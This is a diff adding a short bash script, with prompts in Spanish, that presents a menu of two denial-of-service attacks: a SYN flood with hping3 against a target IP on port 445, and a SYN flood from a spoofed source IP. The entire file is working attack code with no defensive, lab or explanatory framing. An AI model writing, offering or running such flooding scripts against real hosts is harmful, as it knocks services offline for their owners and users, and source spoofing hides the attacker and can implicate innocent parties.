@@ -1,0 +1,23 @@
+#!/bin/bash
+
+echo "Selecciona el tipo de ataque:"
+echo "1. Ataque de inundación SYN simple"
+echo "2. Ataque de inundación SYN con suplantación de IP y puerto específico"
+read -p "Elige una opción (1 o 2): " opcion
+
+case $opcion in
+    1)
+        read -p "Ingresa la dirección IP del objetivo: " ip_objetivo
+        sudo hping3 $ip_objetivo --flood -S -p 445
+        ;;
+    2)
+        read -p "Ingresa la dirección IP del objetivo: " ip_objetivo
+        read -p "Ingresa la dirección IP para suplantar: " ip_suplantar
+        sudo hping3 --flood -S $ip_objetivo -a $ip_suplantar -s 445 -p 445
+        ;;
+    *)
+        echo "Opción no válida."
+        exit 1
+        ;;
+esac
+
